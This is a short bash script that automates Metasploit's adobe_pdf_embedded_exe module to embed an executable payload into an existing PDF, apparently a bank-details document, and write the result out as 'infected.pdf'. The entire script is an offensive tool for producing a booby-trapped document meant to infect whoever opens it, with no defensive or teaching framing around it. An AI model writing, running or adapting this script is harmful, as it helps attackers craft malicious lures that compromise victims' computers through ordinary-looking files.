#!/bin/bash

PDF_ORIGINAL="pdf/rib.pdf"
EXE_PAYLOAD="pdf/payload.exe"
OUTPUT_DIR="pdf/output"
OUTPUT_NAME="infected.pdf"

SCRIPT_FILE="pdf/pdf_payload.rc"

echo "use exploit/windows/fileformat/adobe_pdf_embedded_exe" > $SCRIPT_FILE
echo "set FILENAME $OUTPUT_NAME" >> $SCRIPT_FILE
echo "set INFILENAME $PDF_ORIGINAL" >> $SCRIPT_FILE
echo "set EXENAME $EXE_PAYLOAD" >> $SCRIPT_FILE
echo "set OUTPUTPATH $OUTPUT_DIR" >> $SCRIPT_FILE
echo "exploit" >> $SCRIPT_FILE
echo "exit" >> $SCRIPT_FILE

msfconsole -r $SCRIPT_FILE